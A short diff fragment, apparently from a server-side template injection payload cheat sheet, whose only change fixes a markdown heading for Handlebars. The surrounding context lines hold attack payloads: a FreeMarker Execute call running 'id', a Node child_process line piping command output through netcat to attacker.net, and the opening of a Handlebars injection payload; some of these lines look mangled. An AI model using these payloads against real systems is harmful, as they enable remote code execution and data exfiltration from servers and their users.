@@ -284,7 +284,7 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 - x = x('child_process')
 = x.exec('id | nc attacker.net 80')
 ```
-##Handlebars
+## Handlebars
 ```
 {{#with "s" as |string|}}
   {{#with "e"}}
